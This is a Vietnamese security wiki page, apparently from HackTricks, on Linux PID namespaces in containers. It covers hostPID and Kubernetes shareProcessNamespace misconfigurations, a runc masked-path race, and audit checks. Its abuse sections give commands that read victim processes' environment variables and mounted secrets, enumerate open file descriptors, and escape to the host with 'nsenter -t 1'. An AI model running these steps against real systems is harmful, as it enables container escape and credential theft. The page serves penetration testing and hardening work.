# Không gian tên PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Tổng quan

Không gian tên PID kiểm soát cách đánh số tiến trình và những tiến trình nào có thể được nhìn thấy. Vì vậy, một container có thể có PID 1 riêng dù nó không phải là một máy thật. Bên trong không gian tên, workload thấy một cây tiến trình có vẻ như của cục bộ. Bên ngoài không gian tên, host vẫn thấy các PID thực của host và toàn bộ tiến trình.<sup>[[3]](#references)</sup>

Từ góc độ bảo mật, không gian tên PID quan trọng vì khả năng quan sát tiến trình có giá trị. Khi workload có thể thấy các tiến trình của host, nó có thể quan sát tên dịch vụ, đối số dòng lệnh, bí mật được truyền trong đối số tiến trình, trạng thái bắt nguồn từ môi trường thông qua `/proc` và các mục tiêu tiềm năng để gia nhập không gian tên. Nếu workload có thể làm nhiều hơn việc chỉ thấy các tiến trình đó, chẳng hạn gửi tín hiệu hoặc dùng ptrace khi đáp ứng các điều kiện thích hợp, vấn đề sẽ nghiêm trọng hơn nhiều.

## Hoạt động

Một không gian tên PID mới bắt đầu với cách đánh số tiến trình nội bộ riêng. Tiến trình đầu tiên được tạo bên trong sẽ trở thành PID 1 theo góc nhìn của không gian tên đó; điều này cũng đồng nghĩa nó có các ngữ nghĩa đặc biệt giống init đối với tiến trình con mồ côi và cách xử lý tín hiệu. Điều này giải thích nhiều hiện tượng bất thường của container liên quan đến tiến trình init, việc thu gom tiến trình zombie và lý do đôi khi container sử dụng các trình bao bọc init nhỏ gọn.<sup>[[3]](#references)</sup>

Không gian tên PID tạo thành một cấu trúc phân cấp. Một tiến trình trong không gian tên tổ tiên có thể truy cập các tiến trình thuộc không gian tên hậu duệ bằng PID được gán trong không gian tên tổ tiên đó, nhưng tiến trình thuộc không gian tên hậu duệ không thể truy cập các tiến trình chỉ thuộc không gian tên tổ tiên bằng các syscall thông thường dựa trên PID hoặc dùng `setns()` để đi lên không gian tên PID tổ tiên. Một procfs do tổ tiên sở hữu nhưng được cố ý hiển thị cho tiến trình hậu duệ vẫn có thể làm lộ góc nhìn tiến trình của tổ tiên. Ngoài ra, tham gia một không gian tên PID bằng `setns()` chỉ thay đổi không gian tên áp dụng cho **các tiến trình con được tạo sau đó**, chứ không thay đổi không gian tên của chính tiến trình gọi; vì vậy, các công cụ sẽ fork sau khi tham gia. Một mount procfs giữ nguyên góc nhìn PID của tiến trình đã mount nó, vì thế việc tạo procfs mới sau `unshare(CLONE_NEWPID)` có ý nghĩa về bảo mật, không chỉ là vấn đề hình thức.<sup>[[3]](#references)</sup>

Bài học bảo mật quan trọng là một tiến trình có thể trông như được cô lập vì chỉ thấy cây PID của chính nó, nhưng sự cô lập đó có thể bị loại bỏ một cách có chủ đích. Docker cung cấp khả năng này thông qua `--pid=host`, còn Kubernetes thực hiện điều đó bằng `hostPID: true`. Khi container tham gia không gian tên PID của host, workload sẽ thấy trực tiếp các tiến trình của host, khiến nhiều hướng tấn công tiếp theo trở nên thực tế hơn nhiều.

## Lab

Để tạo không gian tên PID theo cách thủ công:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

Shell giờ thấy một chế độ xem tiến trình riêng tư. Flag `--mount-proc` rất quan trọng vì nó mount một instance procfs khớp với PID namespace mới, giúp danh sách tiến trình bên trong nhất quán.<sup>[[3]](#references)</sup>

Để so sánh hành vi của container:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

Sự khác biệt này rõ ràng ngay lập tức và dễ hiểu, vì vậy đây là lab đầu tiên phù hợp cho độc giả.

## Cách sử dụng trong Runtime

Các container thông thường trong Docker, Podman, containerd và CRI-O có PID namespace riêng. Các container Kubernetes thường có góc nhìn PID riêng; `shareProcessNamespace: true` chủ động tạo một góc nhìn chung cho toàn Pod.<sup>[[4]](#references)</sup> Ngược lại, `hostPID: true` chọn PID namespace của node. Các môi trường LXC/Incus dựa trên cùng một primitive của kernel, dù các trường hợp sử dụng system container có thể làm lộ ra cây tiến trình phức tạp hơn và khuyến khích dùng nhiều lối tắt để debug hơn.

Quy tắc này áp dụng ở mọi nơi: nếu runtime chọn không cô lập PID namespace, đó là sự giảm thiểu có chủ ý đối với ranh giới container.

## Cấu hình sai

Cấu hình sai điển hình là chia sẻ PID của host. Các nhóm thường biện minh cho việc này bằng nhu cầu debug, giám sát hoặc quản lý dịch vụ, nhưng luôn phải xem đây là một ngoại lệ bảo mật đáng kể. Ngay cả khi container không có primitive ghi trực tiếp lên các tiến trình của host, chỉ riêng khả năng quan sát cũng có thể tiết lộ nhiều thông tin về hệ thống. Khi bổ sung các capability như `CAP_SYS_PTRACE` hoặc quyền truy cập procfs hữu ích, rủi ro sẽ tăng đáng kể.

Một sai lầm khác là cho rằng việc chia sẻ PID của host vô hại vì workload mặc định không thể kill hoặc ptrace các tiến trình của host. Kết luận đó bỏ qua giá trị của việc liệt kê, sự sẵn có của các mục tiêu để vào namespace, và cách khả năng quan sát PID kết hợp với những biện pháp kiểm soát khác bị suy yếu.

### Chia sẻ tiến trình trong toàn Pod của Kubernetes

`shareProcessNamespace: true` khác với `hostPID`: tùy chọn này làm lộ tiến trình của **các container khác trong cùng Pod**, chứ không phải tiến trình của node. Khi đó, sidecar hoặc debug container bị xâm nhập có thể liệt kê command line và dữ liệu môi trường của các container cùng Pod, tùy theo các kiểm tra quyền truy cập procfs; gửi signal khi credential cho phép; và duyệt filesystem của container cùng Pod thông qua `/proc/<pid>/root`. Kubernetes nêu rõ rằng khi đó, command line, secret trong biến môi trường và filesystem của container chỉ được bảo vệ bằng các quyền Unix áp dụng tương ứng.<sup>[[4]](#references)</sup>

Các mục cần rà soát ở phía cluster:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Từ một container bị xâm nhập trong PID namespace dùng chung toàn Pod, trước tiên hãy kiểm tra quyền truy cập thực tế thay vì cho rằng nhìn thấy đồng nghĩa với đọc được:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

## Lạm dụng

Nếu dùng chung host PID namespace, kẻ tấn công có thể kiểm tra các tiến trình trên host, thu thập đối số của tiến trình, xác định các dịch vụ đáng chú ý, tìm các PID tiềm năng cho `nsenter`, hoặc kết hợp khả năng xem tiến trình với quyền liên quan đến ptrace để can thiệp vào workload trên host hoặc workload lân cận. Trong một số trường hợp, chỉ cần nhìn thấy đúng tiến trình chạy lâu dài là đủ để định hình lại phần còn lại của kế hoạch tấn công.

Bước thực tế đầu tiên luôn là xác nhận rằng các tiến trình trên host thực sự hiển thị:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Khi PID của host hiển thị được, tham số tiến trình và các mục tiêu để vào namespace thường trở thành nguồn thông tin hữu ích nhất:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

Nếu có `nsenter` và đủ quyền, hãy kiểm tra xem có thể dùng một tiến trình trên host nhìn thấy được làm cầu nối namespace hay không:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Ngay cả khi việc xâm nhập bị chặn, chia sẻ PID của host vẫn có giá trị vì nó tiết lộ cách bố trí dịch vụ, các thành phần runtime và những tiến trình có đặc quyền tiềm năng để nhắm tới tiếp theo. Chỉ nhìn thấy PID **không** cấp quyền gửi signal, trace, đọc các mục nhạy cảm trong `/proc/<pid>` hoặc tham gia các namespace khác của mục tiêu; credentials, dumpability, capabilities trong user namespace sở hữu namespace của mục tiêu, chính sách Yama/LSM và seccomp vẫn có ý nghĩa.<sup>[[3]](#references)</sup> Xem [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) để biết các ví dụ về process injection.

Khả năng nhìn thấy PID của host cũng khiến việc lạm dụng file descriptor thực tế hơn. Nếu một tiến trình host có đặc quyền hoặc workload lân cận đang mở một file hay socket nhạy cảm, kẻ tấn công có thể kiểm tra `/proc/<pid>/fd/` và truy cập đối tượng bên dưới, tùy thuộc vào các kiểm tra kiểu ptrace, quyền sở hữu, tùy chọn mount procfs, loại đối tượng và mô hình dịch vụ mục tiêu. Chỉ nhìn thấy symlink FD không có nghĩa là có thể mở nó; socket cũng không thể được nhân bản chỉ bằng cách mở symlink `/proc/<pid>/fd/N` của nó. Để tìm hiểu primitive `pidfd_getfd()` riêng biệt và các bước kiểm tra quyền của nó, xem [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Các lệnh này hữu ích vì chúng cho biết liệu `hidepid=1` hoặc `hidepid=2` có làm giảm khả năng quan sát giữa các process hay không, và liệu các file descriptor đáng chú ý như file bí mật đang mở, log hoặc Unix socket có hiển thị hay không.

### Ví dụ đầy đủ: PID của host + `nsenter`

Việc chia sẻ PID của host trở thành một cách thoát khỏi host trực tiếp khi process cũng có đủ đặc quyền để tham gia các namespace của host:

```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```

Nếu lệnh thành công, tiến trình container hiện đang chạy trong các namespace mount, UTS, network, IPC và PID của host. Tác động là host bị compromise ngay lập tức.

Ngay cả khi thiếu `nsenter`, vẫn có thể đạt được kết quả tương tự thông qua binary của host nếu filesystem của host được mount:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```

### Ghi chú runtime gần đây

Một số cuộc tấn công liên quan đến PID namespace không xuất phát từ cấu hình sai truyền thống `hostPID: true`, mà từ lỗi trong quá trình triển khai runtime liên quan đến cách áp dụng các biện pháp bảo vệ procfs khi thiết lập container.

#### Race condition `maskedPaths` dẫn đến host procfs

Trong các phiên bản `runc` dễ bị tấn công, kẻ tấn công có thể kiểm soát container image hoặc workload `runc exec` và tạo race condition trong giai đoạn masking bằng cách thay `/dev/null` phía container bằng symlink trỏ đến một đường dẫn procfs nhạy cảm, chẳng hạn như `/proc/sys/kernel/core_pattern`. Nếu race condition thành công, bind mount của masked path có thể gắn nhầm vào đích khác và để lộ các thiết lập procfs toàn cục của host cho container mới.<sup>[[1]](#references)</sup>

Lệnh hữu ích để rà soát:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

Điều này quan trọng vì tác động cuối cùng có thể giống như khi procfs bị lộ trực tiếp: `core_pattern` hoặc `sysrq-trigger` có quyền ghi, dẫn đến thực thi mã trên host hoặc từ chối dịch vụ. Các trang chuyên biệt về [masked paths](../masked-paths.md) và [sensitive host mounts](../../sensitive-host-mounts.md) đề cập đến bề mặt tấn công procfs nói chung mà không lặp lại nội dung ở đây.

#### Chèn namespace bằng `insject`

Các công cụ chèn namespace như `insject` cho thấy việc tương tác với PID namespace không phải lúc nào cũng đòi hỏi phải vào namespace mục tiêu trước khi tạo tiến trình. Một helper có thể gắn vào sau, dùng `setns()` và thực thi trong khi vẫn duy trì khả năng quan sát không gian PID mục tiêu:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Loại kỹ thuật này chủ yếu quan trọng trong các quy trình debug nâng cao, công cụ offensive và post-exploitation, nơi cần tham gia vào namespace context sau khi runtime đã khởi chạy workload.

### Các mẫu lạm dụng FD liên quan

Có hai mẫu cần nêu rõ khi host PIDs hiển thị. Thứ nhất, một process có đặc quyền có thể giữ một file descriptor nhạy cảm mở qua `execve()` vì nó không được đánh dấu `O_CLOEXEC`. Thứ hai, các dịch vụ có thể truyền file descriptor qua Unix socket bằng `SCM_RIGHTS`. Trong cả hai trường hợp, đối tượng đáng chú ý không còn là pathname mà là handle đã mở, thứ mà process có đặc quyền thấp hơn có thể kế thừa hoặc nhận được.

Điều này quan trọng khi làm việc với container vì handle có thể trỏ đến `docker.sock`, một log có đặc quyền, một file bí mật trên host hoặc một đối tượng giá trị cao khác, ngay cả khi không thể truy cập trực tiếp đường dẫn đó từ filesystem của container.

## Checks

Mục đích của các lệnh này là xác định xem process có PID view riêng hay đã có thể liệt kê một phạm vi process rộng hơn nhiều.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

Điều gì đáng chú ý ở đây:<sup>[[3]](#references)</sup>

- Nếu danh sách tiến trình có các dịch vụ của host rõ ràng, khả năng cao host PID sharing đã được bật.
- Chỉ thấy một cây tiến trình nhỏ trong container là trạng thái mặc định bình thường; thấy `systemd`, `dockerd` hoặc các daemon không liên quan thì không.
- `NSpid` có thể cho thấy ánh xạ PID qua các namespace lồng nhau. Giá trị ngoài cùng bên trái tương ứng với PID namespace gắn với lần mount procfs, tiếp theo là các giá trị trong những namespace lồng nhau lần lượt.
- Chỉ riêng `readlink /proc/self/ns/pid` không thể chứng minh `hostPID`: container bị cô lập cũng có inode PID namespace hợp lệ. Hãy đối chiếu với danh sách tiến trình, mount procfs, cấu hình runtime và inode namespace phía host nếu có.
- Khi PID của host hiển thị, ngay cả thông tin tiến trình chỉ đọc cũng hữu ích cho việc do thám.

Nếu phát hiện container đang chạy với host PID sharing, đừng xem đây chỉ là khác biệt về hình thức. Điều này làm thay đổi đáng kể những gì workload có thể quan sát và có khả năng tác động đến.

## References

- [1] [Khuyến cáo bảo mật runc: thoát container thông qua việc lạm dụng "masked path" do điều kiện tranh chấp khi mount (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Phát hành công cụ – insject: Công cụ đưa vào Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Sách Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Chia sẻ Process Namespace giữa các Container trong một Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
